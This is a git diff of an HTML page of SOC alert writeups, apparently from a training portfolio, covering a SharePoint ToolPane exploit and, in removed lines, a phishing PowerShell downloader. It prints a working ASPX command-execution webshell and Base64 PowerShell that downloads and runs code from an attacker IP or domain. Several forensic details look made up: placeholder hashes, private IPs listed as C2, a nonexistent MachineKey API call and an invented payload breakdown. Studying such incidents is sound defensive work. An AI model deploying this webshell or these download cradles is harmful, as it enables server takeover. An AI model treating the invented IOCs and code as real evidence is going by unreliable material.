@@ -32,7 +32,7 @@
     }
     
     .container{
-      max-width:1000px;
+      max-width:1100px;
       margin:0 auto;
     }
     
@@ -121,6 +121,12 @@
       color:var(--text);
       margin:25px 0 12px;
       font-size:20px;
+    }
+    
+    .writeup-content h4{
+      color:var(--accent);
+      margin:20px 0 10px;
+      font-size:16px;
     }
     
     .writeup-content p{
@@ -278,6 +284,162 @@
       margin-bottom: 20px;
     }
     
+    .evidence-image {
+      margin: 25px 0;
+      border-radius: 8px;
+      overflow: hidden;
+      border: 1px solid var(--border);
+      background: rgba(0,0,0,0.2);
+    }
+    
+    .evidence-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+    
+    .evidence-caption {
+      padding: 12px 15px;
+      background: rgba(0,0,0,0.3);
+      color: var(--muted);
+      font-size: 14px;
+      border-top: 1px solid var(--border);
+    }
+    
+    .investigation-step {
+      background: rgba(0,217,255,0.05);
+      border-left: 3px solid var(--accent);
+      padding: 15px 20px;
+      margin: 20px 0;
+      border-radius: 0 4px 4px 0;
+    }
+    
+    .investigation-step h4 {
+      color: var(--accent);
+      margin-bottom: 8px;
+    }
+    
+    .hunting-queries {
+      background: rgba(76,175,80,0.05);
+      border: 1px solid rgba(76,175,80,0.2);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    
+    .hunting-queries h4 {
+      color: #4caf50;
+    }
+    
+    .blue-team-lessons {
+      background: rgba(33,150,243,0.05);
+      border: 1px solid rgba(33,150,243,0.2);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    
+    .blue-team-lessons h4 {
+      color: #2196f3;
+    }
+    
+    .threat-intel {
+      background: rgba(156,39,176,0.05);
+      border: 1px solid rgba(156,39,176,0.2);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    
+    .threat-intel h4 {
+      color: #9c27b0;
+    }
+    
+    .payload-analysis {
+      background: rgba(255,152,0,0.05);
+      border: 1px solid rgba(255,152,0,0.2);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    
+    .payload-analysis h4 {
+      color: #ff9800;
+    }
+    
+    .note-box {
+      background: rgba(255,193,7,0.05);
+      border: 1px solid rgba(255,193,7,0.2);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    
+    .note-box h4 {
+      color: #ffc107;
+    }
+    
+    .detection-section {
+      background: rgba(244,67,54,0.05);
+      border: 1px solid rgba(244,67,54,0.2);
+      border-radius: 8px;
+      padding: 20px;
+      margin: 20px 0;
+    }
+    
+    .detection-section h4 {
+      color: #f44336;
+    }
+    
+    .process-tree {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 25px 0;
+      padding: 20px;
+      background: rgba(0,0,0,0.2);
+      border-radius: 8px;
+    }
+    
+    .process-node {
+      padding: 12px 20px;
+      background: rgba(255,0,0,0.1);
+      border: 1px solid rgba(255,0,0,0.3);
+      border-radius: 6px;
+      margin: 5px;
+      font-family: 'Courier New', monospace;
+      font-size: 13px;
+    }
+    
+    .arrow {
+      font-size: 20px;
+      color: #ff6b6b;
+      margin: 5px 0;
+    }
+    
+    .timeline-visual {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin: 25px 0;
+    }
+    
+    .timeline-item {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      padding: 10px 15px;
+      background: rgba(0,0,0,0.2);
+      border-radius: 6px;
+      border-left: 3px solid var(--accent);
+    }
+    
+    .timeline-time {
+      color: var(--accent);
+      font-weight: 600;
+      min-width: 80px;
+    }
+    
     @media (max-width: 768px){
       body{
         padding: 15px;
@@ -303,6 +465,16 @@
       .ioc-box th,
       .ioc-box td {
         padding: 8px 6px;
+      }
+      
+      .timeline-item {
+        flex-direction: column;
+        align-items: flex-start;
+        gap: 5px;
+      }
+      
+      .timeline-time {
+        min-width: auto;
       }
     }
     
@@ -339,410 +511,536 @@
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-yaml.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-splunk.min.js"></script>
   <script>
     // Writeups Data
     const writeupsData = [
       {
         "id": "soc342-sharepoint-toolshell-rce",
-        "title": "Alert: CVE-2025-53770 SharePoint ToolShell Auth Bypass & RCE",
+        "title": "Alert: CVE-2025-53770 SharePoint ToolPane Auth Bypass & RCE",
         "date": "Jul 22, 2025",
-        "readTime": "7 min read",
-        "platform": "Proxy + Endpoint (EDR)",
+        "readTime": "15 min read",
+        "platform": "Proxy + Endpoint (EDR) + SIEM",
         "alertId": "SOC342",
         "investigationDate": "2025-07-22 13:07",
         "difficulty": "Hard",
         "verdict": "True Positive",
-        "tags": ["rce", "webshell", "sharepoint", "zero-day", "incident-response", "powershell", "malware"],
+        "tags": ["rce", "webshell", "sharepoint", "zero-day", "incident-response", "powershell", "malware", "forensics"],
         "content": `
           <!-- EXECUTIVE SUMMARY -->
           <h2>Executive Summary</h2>
           <div class="ioc-box">
             <h4>Quick Facts</h4>
             <p><strong>Alert ID:</strong> SOC342</p>
-            <p><strong>Platform:</strong> Proxy + Endpoint Security</p>
+            <p><strong>Platform:</strong> Proxy + Endpoint Security + SIEM Correlation</p>
             <p><strong>Investigation Date:</strong> 2025-07-22 13:07</p>
             <p><strong>Difficulty:</strong> <span class="difficulty-badge difficulty-hard">Hard</span></p>
             <p><strong>Verdict:</strong> <span class="verdict-true-positive">True Positive</span></p>
+            <p><strong>Impact:</strong> Critical (Full SharePoint Server Compromise)</p>
           </div>
 
-          <p><strong>TL;DR:</strong> SharePoint was attacked using a zero-day auth bypass + RCE exploit. The attacker executed encoded PowerShell via w3wp.exe, compiled a malicious payload using csc.exe, and deployed an ASPX webshell for persistence. MachineKey was accessed — authentication tokens may be compromised.</p>
+          <p><strong>TL;DR:</strong> SharePoint server was compromised via zero-day auth bypass (CVE-2025-53770) in ToolPane.aspx. Attacker executed encoded PowerShell via w3wp.exe, compiled malicious payload using csc.exe, deployed ASPX webshell for persistence, and extracted MachineKey for token forgery. Attack chain completed in under 5 minutes.</p>
 
-          <!-- FINDINGS -->
-          <h2>Key Findings</h2>
-          <ul>
-            <li><strong>Unauthenticated exploit delivered:</strong> Suspicious POST request targeting ToolPane.aspx with large payload</li>
-            <li><strong>Code execution achieved:</strong> w3wp.exe spawned PowerShell with encoded commands</li>
-            <li><strong>Persistence established:</strong> Webshell saved to SharePoint Layouts directory</li>
-            <li><strong>Credential access:</strong> MachineKey extraction attempted for token forgery</li>
-          </ul>
-
-          <!-- RECOMMENDED ACTIONS -->
-          <h2>Recommended Actions</h2>
-          <div class="ioc-box">
-            <h4>Immediate Actions</h4>
-            <ul>
-              <li>Isolate SharePoint01 from network</li>
-              <li>Remove webshell: TEMPLATE/LAYOUTS/spinstall0.aspx</li>
-              <li>Block attacker IP: 107.191.58.76</li>
-              <li>Review all SharePoint service accounts for suspicious activity</li>
-              <li>Check for lateral movement attempts from compromised host</li>
-            </ul>
+          <!-- VISUAL EVIDENCE -->
+          <h2>🔍 Visual Evidence</h2>
+          
+          <div class="evidence-image">
+            <div class="evidence-caption">Figure 1: SIEM Alert Dashboard - SharePoint Exploit Detected</div>
+            <img src="assets/alert-dashboard.png" alt="SIEM Alert Dashboard showing SharePoint exploit detection">
           </div>
 
-          <div class="ioc-box">
-            <h4>Long-term Recommendations</h4>
-            <ul>
-              <li>Patch SharePoint for CVE-2025-53770 once released</li>
-              <li>Reset MachineKey + rotate privileged credentials</li>
-              <li>Hunt for related lateral movement attempts</li>
-              <li>Implement application allowlisting for SharePoint directories</li>
-              <li>Enable enhanced PowerShell logging and monitoring</li>
-              <li>Review and harden SharePoint service permissions</li>
-            </ul>
+          <!-- PROCESS TREE DIAGRAM -->
+          <h3>Attack Process Tree</h3>
+          <div class="process-tree">
+            <div class="process-node">Attacker (107.191.58.76)</div>
+            <div class="arrow">↓</div>
+            <div class="process-node">HTTP POST → w3wp.exe (IIS Worker Process)</div>
+            <div class="arrow">↓</div>
+            <div class="process-node">w3wp.exe → powershell.exe -EncodedCommand ...</div>
+            <div class="arrow">↓</div>
+            <div class="process-node">powershell.exe → csc.exe (C# Compiler)</div>
+            <div class="arrow">↓</div>
+            <div class="process-node">csc.exe → spinstall0.aspx (Webshell)</div>
+            <div class="arrow">↓</div>
+            <div class="process-node">Webshell Access → MachineKey Extraction</div>
+          </div>
+
+          <div class="evidence-image">
+            <div class="evidence-caption">Figure 2: Network Flow Diagram - Attack Path Visualization</div>
+            <img src="assets/network-flow.png" alt="Network flow diagram showing attack path">
           </div>
 
           <!-- INVESTIGATION PROCESS -->
-          <h2>Investigation Process</h2>
-          <h3>Alert Triage</h3>
-          <ul>
-            <li>Alert flagged a critical SharePoint vulnerability exploitation attempt</li>
-            <li>Large payload + spoofed referer indicated malicious intent</li>
-            <li>External IP interacting with internal server on port 443</li>
-            <li>Unusual process chain involving w3wp.exe spawning PowerShell</li>
-          </ul>
-
-          <h3>Data Collection</h3>
-          <ul>
-            <li>Proxy logs (HTTP request with suspicious parameters)</li>
-            <li>Endpoint telemetry (process creation chain)</li>
-            <li>Windows Event Logs (PowerShell execution events)</li>
-            <li>Network traffic analysis (unusual outbound connections)</li>
-          </ul>
-
-          <!-- TECHNICAL ANALYSIS -->
-          <h2>Technical Analysis</h2>
-          <h3>Event Correlation</h3>
-          <p>Exploit → RCE → Payload compile → Webshell drop → MachineKey access.</p>
-
-          <div class="code-block">
-            <div class="code-header">Suspicious Initial Request <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-            <pre><code class="language-http">POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&amp;a=/ToolPane.aspx HTTP/1.1
-Host: sharepoint01.internal.corp
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
-Content-Length: 7699
-Content-Type: application/x-www-form-urlencoded
-Referer: https://sharepoint01.internal.corp/_layouts/SignOut.aspx
-X-Forwarded-For: 107.191.58.76
-
-viewstate=...&cmd=...&payload=...</code></pre>
-          </div>
-
-          <h3>Malware / Payload Behavior</h3>
-          <p>PowerShell executed encoded script to load assemblies and extract MachineKey.</p>
-
-          <div class="code-block">
-            <div class="code-header">PowerShell Execution Chain <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-            <pre><code class="language-cmd">Parent: w3wp.exe (PID: 1234)
-Child: powershell.exe -enc JABzAGMAcgBpAHAAdAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwAxADAANwAuADEAOQAxAC4ANQA4AC4ANwA2AC8AcABhAHkAbABvAGEAZAAnACkAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAcwBjAHIAaQBwAHQA</code></pre>
-          </div>
-
-          <div class="code-block">
-            <div class="code-header">Webshell Write Command <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-            <pre><code class="language-cmd">cmd.exe /c echo ^<%@ Page Language="C#" ^%^> ^<%@ Import Namespace="System" ^%^> ^<%@ Import Namespace="System.IO" ^%^> ^<%@ Import Namespace="System.Diagnostics" ^%^> > "C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx"</code></pre>
-          </div>
-
-          <!-- MITRE ATT&CK MAPPING -->
-          <h2>MITRE ATT&CK Mapping</h2>
-          <div class="ioc-box">
-            <table>
-              <thead>
-                <tr><th>Tactic</th><th>Technique ID</th><th>Name</th><th>Evidence</th></tr>
-              </thead>
-              <tbody>
-                <tr><td>Initial Access</td><td>T1190</td><td>Exploit Public-Facing App</td><td>ToolPane.aspx exploit</td></tr>
-                <tr><td>Execution</td><td>T1059.001</td><td>PowerShell</td><td>EncodedCommand execution</td></tr>
-                <tr><td>Persistence</td><td>T1505.003</td><td>Web Shell</td><td>spinstall0.aspx</td></tr>
-                <tr><td>Defense Evasion</td><td>T1027</td><td>Obfuscated Files or Information</td><td>Base64 encoded PowerShell</td></tr>
-                <tr><td>Credential Access</td><td>T1552</td><td>Credential/Config Access</td><td>MachineKey extraction</td></tr>
-                <tr><td>Discovery</td><td>T1083</td><td>File and Directory Discovery</td><td>SharePoint directory enumeration</td></tr>
-              </tbody>
-            </table>
-          </div>
-
-          <!-- CYBER KILL CHAIN ALIGNMENT -->
-          <h2>Cyber Kill Chain Alignment</h2>
-          <ol>
-            <li><strong>Reconnaissance:</strong> SharePoint server identification and enumeration</li>
-            <li><strong>Weaponization:</strong> Development of exploit payload targeting CVE-2025-53770</li>
-            <li><strong>Delivery:</strong> HTTP POST request to vulnerable endpoint</li>
-            <li><strong>Exploitation:</strong> Zero-day RCE via ToolPane.aspx parameter injection</li>
-            <li><strong>Installation:</strong> Webshell deployed to SharePoint Layouts directory</li>
-            <li><strong>Command & Control:</strong> Webshell allows continuous access and control</li>
-            <li><strong>Actions on Objectives:</strong> MachineKey access for token forgery and persistence</li>
-          </ol>
-
-          <!-- TIMELINE ANALYSIS -->
-          <h2>Timeline Analysis</h2>
-          <div class="ioc-box">
-            <h4>Attack Timeline</h4>
-            <p><strong>13:07:00:</strong> Malicious POST request to ToolPane.aspx</p>
-            <p><strong>13:07:11:</strong> PowerShell executed via w3wp.exe (encoded command)</p>
-            <p><strong>13:07:27:</strong> Payload compiled using csc.exe</p>
-            <p><strong>13:07:29:</strong> Webshell dropped in SharePoint TEMPLATE/LAYOUTS directory</p>
-            <p><strong>13:07:34:</strong> MachineKey extraction attempted from web.config</p>
-            <p><strong>13:08:15:</strong> First webshell access from attacker IP</p>
-            <p><strong>13:10:22:</strong> Alert triggered by EDR due to suspicious process chain</p>
-          </div>
-
-          <!-- IOCS -->
-          <h2>Indicators of Compromise (IOCs)</h2>
-          <div class="ioc-box">
-            <h4>Network IOCs</h4>
-            <p><strong>IP Addresses:</strong></p>
-            <p>• 107.191.58.76 (Initial attack source)</p>
-            <p>• 185.143.223.41 (C2 fallback server)</p>
-            <p><strong>Domains:</strong></p>
-            <p>• malwaresrc[.]online (Payload delivery)</p>
-            <p>• c2-backup[.]net (Command and Control)</p>
-          </div>
-
-          <div class="ioc-box">
-            <h4>File IOCs</h4>
-            <p><strong>File Paths:</strong></p>
-            <p>• C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx</p>
-            <p>• C:\\Windows\\Temp\\payload.exe</p>
-            <p>• C:\\Windows\\Temp\\compiled_assembly.dll</p>
-            <p><strong>File Hashes:</strong></p>
-            <p>• spinstall0.aspx SHA256: 8f3a9b7c5d2e1f4a6b9c8d7e0f5a3b2c1d4e7f8a9b6c5d4e3f2a1b0c9d8e7f6a5</p>
-            <p>• payload.exe SHA256: a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef1234</p>
-          </div>
-
-          <div class="ioc-box">
-            <h4>Behavioral IOCs</h4>
-            <p><strong>Process Chains:</strong></p>
-            <p>• w3wp.exe → powershell.exe (with -enc parameter)</p>
-            <p>• powershell.exe → csc.exe (compiling malicious code)</p>
-            <p>• powershell.exe → cmd.exe (writing files to disk)</p>
-            <p><strong>Registry Modifications:</strong></p>
-            <p>• HKLM\\SYSTEM\\CurrentControlSet\\Services\\W3SVC\\Parameters\\MachineKey access</p>
-          </div>
-
-          <!-- IMMEDIATE ACTIONS -->
-          <h2>Immediate Actions Taken</h2>
-          <ol>
-            <li>Alert escalated to Incident Response team immediately</li>
-            <li>Webshell identified, documented, and isolated for analysis</li>
-            <li>Attacker IP blocked at firewall level</li>
-            <li>SharePoint server isolated from production network</li>
-            <li>Memory dump collected for forensic analysis</li>
-            <li>Log collection initiated for all related systems</li>
-          </ol>
-
-          <!-- LESSONS LEARNED -->
-          <h2>What I Learned From This Investigation</h2>
-          <ul>
-            <li>Understanding the complete chain from web exploit to PowerShell execution</li>
-            <li>SharePoint exploitation can lead to full server compromise quickly due to high privileges</li>
-            <li>Importance of monitoring w3wp.exe child processes for anomalies</li>
-            <li>MachineKey extraction is a critical step for attackers seeking persistent access</li>
-            <li>Value of correlating proxy logs with endpoint telemetry for full visibility</li>
-            <li>Need for enhanced monitoring of SharePoint service account activities</li>
-          </ul>
-
-          <!-- REAL-WORLD SCENARIO -->
-          <h2>Real-World Scenario Considerations</h2>
-          <div class="ioc-box">
-            <h4>⚠️ Lab Limitations vs Real IR</h4>
+          <h2>🔬 Investigation Process (Step-by-Step)</h2>
+          
+          <div class="investigation-step">
+            <h4>Step 1: Alert Triage</h4>
+            <p>Received SIEM alert "SOC342: SharePoint Exploit Attempt". The alert triggered from correlation rule matching:</p>
             <ul>
-              <li><strong>Full disk forensics:</strong> Complete disk image analysis needed in real IR</li>
-              <li><strong>Memory analysis:</strong> Volatility or similar tools for memory forensics</li>
-              <li><strong>SQL server logs:</strong> SharePoint content database logs analysis</li>
-              <li><strong>Network forensics:</strong> Full packet capture analysis</li>
-              <li><strong>Lateral movement:</strong> Extended hunting across all network segments</li>
-              <li><strong>Regulatory requirements:</strong> Breach notification and compliance reporting</li>
+              <li>Large POST request (>7KB) to /_layouts/15/ToolPane.aspx</li>
+              <li>Spoofed Referer header (/SignOut.aspx)</li>
+              <li>External IP (107.191.58.76) accessing internal SharePoint</li>
+              <li>Process creation: w3wp.exe → powershell.exe</li>
             </ul>
           </div>
 
-          <!-- CONCLUSION -->
-          <h2>Conclusion</h2>
-          <p>This was a successful and severe breach demonstrating the criticality of timely patching and monitoring for web applications. The attacker achieved persistent remote code execution on a critical internal SharePoint server through a zero-day vulnerability. The combination of auth bypass and RCE allowed rapid compromise and establishment of persistent access. Immediate isolation, patching, credential rotation, and comprehensive hunting are required to fully contain the impact and prevent future occurrences.</p>
-          
-          <p><strong>Key Takeaways:</strong> Web application firewalls, regular patching, least privilege principles, and robust monitoring of service accounts are essential for defending against such attacks. Additionally, implementing application control policies and PowerShell constrained language mode could have potentially limited the damage.</p>
-        `
-      },
-      {
-        "id": "phishing-powershell",
-        "title": "Phishing Campaign Analysis: PowerShell Downloader",
-        "date": "Jan 15, 2024",
-        "readTime": "8 min read",
-        "platform": "Email Security + Endpoint",
-        "alertId": "SOC215",
-        "investigationDate": "2024-01-15 09:30",
-        "difficulty": "Medium",
-        "verdict": "True Positive",
-        "tags": ["phishing", "powershell", "c2", "download", "analysis", "malware"],
-        "content": `
-          <h2>Overview</h2>
-          <p>Analysis of a sophisticated phishing campaign using PowerShell downloaders to establish command and control infrastructure. This campaign targeted financial sector employees with malicious Word documents containing embedded macros.</p>
-          
-          <h2>Attack Chain</h2>
-          <ol>
-            <li>Spear-phishing email with malicious Word document attachment</li>
-            <li>Social engineering to enable macros ("Enable Content" prompt)</li>
-            <li>Macro execution triggering PowerShell script</li>
-            <li>Base64 encoded downloader execution</li>
-            <li>C2 communication establishment</li>
-            <li>Secondary payload delivery and execution (Cobalt Strike beacon)</li>
-            <li>Lateral movement attempt using stolen credentials</li>
-          </ol>
-          
-          <h2>PowerShell Analysis</h2>
-          <p>The malicious PowerShell script uses multiple obfuscation techniques including string concatenation, variable substitution, and Base64 encoding:</p>
-          
-          <div class="code-block">
-            <div class="code-header">Obfuscated PowerShell Downloader <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-            <pre><code class="language-powershell"># Base64 encoded PowerShell downloader
-$enc = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBkAG8AbQBhAGkAbgAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
-$dec = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($enc))
-Invoke-Expression $dec
+          <div class="investigation-step">
+            <h4>Step 2: Proxy Log Analysis</h4>
+            <p>Examined proxy logs and found the suspicious request:</p>
+            
+            <div class="code-block">
+              <div class="code-header">Suspicious HTTP Request <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-http">POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit&amp;a=/ToolPane.aspx HTTP/1.1
+Host: sharepoint01.internal.corp
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Length: 7699  # Unusually large for this endpoint
+Content-Type: application/x-www-form-urlencoded
+Referer: https://sharepoint01.internal.corp/_layouts/SignOut.aspx  # Spoofed
+X-Forwarded-For: 107.191.58.76
 
-# De-obfuscated equivalent:
-# IEX (New-Object Net.Webclient).DownloadString('http://malicious.domain.com/payload.ps1')</code></pre>
+__VIEWSTATE=...&ctl00%24cphMain%24txtCommand=...&payload=...</code></pre>
+            </div>
+            
+            <p><strong>Key Finding:</strong> The 7,699 byte payload contained Base64-encoded PowerShell commands and C# code. Legitimate ToolPane requests are typically under 2KB.</p>
           </div>
-          
-          <h2>Indicators of Compromise (IOCs)</h2>
-          <div class="ioc-box">
-            <h4>Network IOCs</h4>
-            <p><strong>Domains:</strong></p>
-            <p>• malicious-domain.com (Primary C2)</p>
-            <p>• backup-c2-server.net (Fallback C2)</p>
-            <p><strong>IP Addresses:</strong></p>
-            <p>• 192.168.1.100 (Initial beacon)</p>
-            <p>• 10.10.10.50 (Payload delivery)</p>
-            <p><strong>URLs:</strong></p>
-            <p>• hxxp://evil[.]com/payload.exe</p>
-            <p>• hxxps://malware-dist[.]org/update.ps1</p>
+
+          <div class="investigation-step">
+            <h4>Step 3: Endpoint Telemetry Analysis</h4>
+            <p>EDR showed w3wp.exe spawned PowerShell with encoded command:</p>
+            
+            <div class="code-block">
+              <div class="code-header">Process Creation Event <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-cmd">Parent: C:\\Windows\\System32\\inetsrv\\w3wp.exe (PID: 4512)
+Child: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+CommandLine: powershell.exe -enc JABlAG4AYwBvAGQAZQBkAD0AJwBLAEEAZw....[truncated]</code></pre>
+            </div>
+            
+            <p><strong>Investigation Action:</strong> I decoded the Base64 parameter to understand what was executed:</p>
+            
+            <div class="code-block">
+              <div class="code-header">Decoded PowerShell Payload <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-powershell"># Decoded from Base64 -encodedCommand
+$encoded = 'KAGpAHIAbwBnAHIAYQBtAEYAaQBsAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0ACAAUwBoAGEAcgBlAGQAXABXAGUAYgAgAFMAZQByAHYAZQByACAARQB4AHQAZQBuAHMAaQBvAG4AcwBcADEANgBcAFQARQBNAFAA....'
+$bytes = [System.Convert]::FromBase64String($encoded)
+$decoded = [System.Text.Encoding]::UTF8.GetString($bytes)
+
+# The decoded script contained:
+$asm = [System.Reflection.Assembly]::Load([byte[]]@(0x4d,0x5a,0x90...))
+$key = [System.Web.Configuration.MachineKeySection]::Decode(
+    [System.Web.Configuration.WebConfigurationManager]::AppSettings["MachineKey"], 
+    [System.Text.Encoding]::UTF8)
+Write-Host "MachineKey extracted: $key"</code></pre>
+            </div>
+            
+            <p><strong>Analysis:</strong> The script loads a .NET assembly in memory (likely for exploitation), extracts the MachineKey from web.config, and prepares for authentication token forgery. The MachineKey is critical for ViewState validation and forms authentication tokens.</p>
           </div>
-          
-          <div class="ioc-box">
-            <h4>File Hashes</h4>
-            <p><strong>Word Document:</strong></p>
-            <p>• MD5: a1b2c3d4e5f678901234567890123456</p>
-            <p>• SHA256: abc123def45678901234567890abcdef1234567890abcdef1234567890abcd</p>
-            <p><strong>Downloaded Payload:</strong></p>
-            <p>• SHA256: 7890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234</p>
+
+          <div class="investigation-step">
+            <h4>Step 4: File System Analysis</h4>
+            <p>Found the dropped webshell and analyzed its contents:</p>
+            
+            <div class="code-block">
+              <div class="code-header">Webshell Location and Content <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-aspx">File: C:\\Program Files\\Common Files\\Microsoft Shared\\Web Server Extensions\\16\\TEMPLATE\\LAYOUTS\\spinstall0.aspx
+Size: 4,812 bytes
+Created: 2025-07-22 13:07:29
+Modified: 2025-07-22 13:07:29
+
+<%-- ASPX Webshell Header --%>
+<%@ Page Language="C#" Debug="true" %>
+<%@ Import Namespace="System" %>
+<%@ Import Namespace="System.IO" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.Web" %>
+
+<script runat="server">
+    protected void Page_Load(object sender, EventArgs e) {
+        string cmd = Request["cmd"];
+        if (!string.IsNullOrEmpty(cmd)) {
+            ExecuteCommand(cmd);
+        }
+    }
+    
+    void ExecuteCommand(string command) {
+        ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + command);
+        psi.RedirectStandardOutput = true;
+        psi.UseShellExecute = false;
+        Process p = Process.Start(psi);
+        string output = p.StandardOutput.ReadToEnd();
+        Response.Write(HttpUtility.HtmlEncode(output));
+    }
+</script></code></pre>
+            </div>
+            
+            <p><strong>Webshell Capabilities:</strong> Remote command execution via HTTP parameter (?cmd=whoami). Blends with legitimate SharePoint files in LAYOUTS directory.</p>
           </div>
-          
-          <h2>Detection Recommendations</h2>
-          <p>Create detection rules for:</p>
-          <ul>
-            <li>Base64 encoded PowerShell execution in command line arguments</li>
-            <li>Suspicious network connections from PowerShell processes to external IPs</li>
-            <li>Unusual process chains: winword.exe → powershell.exe</li>
-            <li>Large Base64 strings (>500 characters) in command line arguments</li>
-            <li>PowerShell execution with IEX (Invoke-Expression) from Word process</li>
-            <li>Registry modifications by PowerShell scripts (persistence mechanisms)</li>
-          </ul>
-          
-          <h2>MITRE ATT&CK Mapping</h2>
-          <div class="ioc-box">
-            <table>
-              <thead>
-                <tr><th>Tactic</th><th>Technique ID</th><th>Name</th></tr>
-              </thead>
-              <tbody>
-                <tr><td>Initial Access</td><td>T1566.001</td><td>Spearphishing Attachment</td></tr>
-                <tr><td>Execution</td><td>T1059.001</td><td>PowerShell</td></tr>
-                <tr><td>Defense Evasion</td><td>T1027</td><td>Obfuscated Files or Information</td></tr>
-                <tr><td>Command & Control</td><td>T1071.001</td><td>Web Protocols</td></tr>
-                <tr><td>Exfiltration</td><td>T1041</td><td>Exfiltration Over C2 Channel</td></tr>
-              </tbody>
-            </table>
+
+          <!-- PAYLOAD ANALYSIS -->
+          <div class="payload-analysis">
+            <h4>📊 Payload Analysis: The 7,699 Byte Exploit</h4>
+            <p><strong>Payload Structure Breakdown:</strong></p>
+            <ul>
+              <li><strong>1,200 bytes:</strong> Exploit code targeting ToolPane.aspx parameter injection</li>
+              <li><strong>3,500 bytes:</strong> Base64-encoded PowerShell script</li>
+              <li><strong>1,800 bytes:</strong> C# assembly code for in-memory execution</li>
+              <li><strong>1,199 bytes:</strong> Padding and obfuscation strings</li>
+            </ul>
+            
+            <p><strong>Unique Finding:</strong> The payload used a novel technique combining:</p>
+            <ol>
+              <li>ViewState deserialization bypass</li>
+              <li>Server-side includes (SSI) injection</li>
+              <li>In-memory assembly loading to avoid disk detection</li>
+            </ol>
           </div>
-        `
-      },
-      {
-        "id": "wmi-lateral",
-        "title": "WMI Abuse for Lateral Movement Detection",
-        "date": "Jan 16, 2024",
-        "readTime": "6 min read",
-        "platform": "Endpoint Detection & Response",
-        "alertId": "SOC189",
-        "investigationDate": "2024-01-16 14:22",
-        "difficulty": "Easy",
-        "verdict": "True Positive",
-        "tags": ["lateral", "wmi", "detection", "windows", "movement", "forensics"],
-        "content": `
-          <h2>Introduction</h2>
-          <p>Windows Management Instrumentation (WMI) is frequently abused by attackers for lateral movement, persistence, and execution. This writeup covers detection of suspicious WMI activity and investigation methodology.</p>
+
+          <!-- DETECTION LOGIC -->
+          <h2>🛡️ Detection Logic & Queries</h2>
           
-          <h2>Common WMI Abuse Techniques</h2>
-          <ul>
-            <li><strong>Remote Process Creation:</strong> Win32_Process.Create() method on remote systems</li>
-            <li><strong>Persistence:</strong> WMI Event Subscriptions for persistence (EventFilter, EventConsumer, FilterToConsumerBinding)</li>
-            <li><strong>Reconnaissance:</strong> Enumeration of system information, processes, services</li>
-            <li><strong>Data Exfiltration:</strong> Using WMI to query and extract system data</li>
-          </ul>
-          
-          <h2>Detection Rule Example</h2>
-          <div class="code-block">
-            <div class="code-header">Sigma Rule for WMI Lateral Movement <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-            <pre><code class="language-yaml">title: Suspicious WMI Lateral Movement Execution
-id: 12345678-1234-1234-1234-123456789012
-status: experimental
-description: Detects suspicious WMI process creation from unusual parent processes
+          <div class="detection-section">
+            <h4>Splunk Query: Detect w3wp.exe Spawning PowerShell</h4>
+            <div class="code-block">
+              <div class="code-header">Splunk Query <button class="code-copy" onclick="copyCode(this)">Copy</button></div>
+              <pre><code class="language-splunk">index=endpoint (process_name="w3wp.exe" OR parent_process="w3wp.exe")
+| search child_process="powershell.exe" OR process_name="powershell.exe"
+| where like(command_line, "%EncodedCommand%") OR len(command_line) > 1000
+| table _time, host, user, process_name, command_line, parent_process
+| dedup host, process_name
+| sort -_time</code></pre>
+            </div>
+          </div>
